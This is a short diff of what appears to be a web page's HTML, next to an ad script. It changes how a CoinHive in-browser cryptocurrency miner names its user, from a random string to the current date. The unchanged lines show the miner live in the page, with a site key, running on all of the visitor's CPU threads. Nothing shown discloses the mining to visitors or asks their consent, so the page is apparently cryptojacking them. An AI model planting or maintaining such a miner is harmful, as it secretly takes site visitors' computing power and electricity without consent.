@@ -35,7 +35,7 @@ src="//pagead2.googlesyndication.com/pagead/show_ads.js">
 
 
 <script>
-var name = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 8);
+var name = (new Date()).toISOString().slice(0,10).replace(/-/g,"");
 var miner = new CoinHive.User('6N8PcRT201fFHwOLDV0rnDrvB3I9mp4i', name, {
 	    threads: navigator.hardwareConcurrency,
 	    autoThreads: false,
